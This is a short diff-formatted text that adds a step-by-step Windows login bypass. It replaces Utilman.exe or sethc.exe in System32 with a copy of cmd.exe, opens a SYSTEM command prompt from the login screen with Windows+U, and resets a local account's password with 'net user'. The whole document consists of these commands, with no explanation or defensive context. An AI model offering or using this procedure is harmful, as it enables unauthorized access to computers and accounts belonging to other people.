@@ -1,0 +1,16 @@
+D:
+Cd windows\system32
+Ren Utilman.exe Utilman.exe.Old
+Copy cmd.exe Utilman.exe
+
+Boot from hard
+Windows + u
+Cmd will open then
+Net user amghezi pass
+———————————-
+Copy c:\windows\system32\sethc.exe c:\
+Copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe
+——————-
+
+Change password in cmd
+Net user amghezi newpass
